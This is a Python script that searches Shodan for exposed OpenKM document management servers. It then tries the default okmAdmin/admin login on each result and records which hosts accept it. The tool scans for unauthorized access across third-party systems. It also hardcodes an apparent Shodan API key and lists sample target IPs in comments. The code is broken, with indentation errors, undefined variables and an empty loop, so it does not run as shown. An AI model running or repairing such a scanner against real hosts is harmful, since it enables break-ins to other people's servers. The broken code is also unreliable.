# coding=utf-8
import shodan
import requests
import logging

USERNAME = 'okmAdmin'
PASSWORD = 'admin'
global count_success 
global count_fail
global success_list
global fail_list
global total

def search_openkm(API_KEY):
	logging.info("api key:" + API_KEY)
	api = shodan.Shodan(API_KEY)
	results = api.search("openkm")
	logging.debug(results)
	logging.info(results['total'])
	logging.info("search finish!")
#	return iplist
	return results

def check_login(host):
	login_url = '/OpenKM/j_spring_security_check'
	url = 'http://' + host + login_url
	data ={
		'j_username':'okmAdmin',
	 	'j_password':'admin',
	 	'submit':'登录'
	}
	try:
		test_session = requests.Session()
		response = test_session.post(url,data)
		if response.url.find("index.jsp") == -1:
			logging.info(host + ' login fail')
			return False
		else:
			logging.info(host + ' login success')
			return True
	except Exception as e:
		logging.error(e)

def check_results(result_list):
	for result_object in result_list:
			total = result_list['total']

		logging.debug(result)
		url_str = str(result['ip_str']) + ':' + str(result['port'])
		iplist.append(url_str)
		logging.info(url_str)
		if check_login(host):
			success_list.append(host+'\n')
			count_success += 1
			total += 1
		else:
			fail_list.append(host+'\n')
			count_fail += 1
			total += 1

def main():
	SHODAN_API_KEY = 'wKVILEwGhBalnpICFKwCzBblwLmYJe9R'
	results = search_openkm(SHODAN_API_KEY)
	#test host
	#test_hosts = ['59.49.76.213:8001','59.120.19.158:8080']
	#hosts = test_hosts
	total = 0
	count_success = 0
	count_fail = 0
	success_list = []
	fail_list = []
	for result in results:

	write_file(success_list,"success")
	write_file(fail_list,"fail")
	print("total:" + str(total) + " success:" + str(count_success))
	logging.info(str(count_success) + '/' + str(total))


def write_file(list,file_name):
	logging.info("write list :" + file_name)
	file = open(file_name + '.txt','w+')
	try:
		file.writelines(list)
	except Exception as e:
		logging.debug(e)
	finally:
		file.close()

if __name__ == '__main__':
	log_file = "./basic_logger.log"
	logging.basicConfig(filename = log_file, level = logging.INFO)
	logging.info("mission start!")
	main()
	logging.info("mission finish!")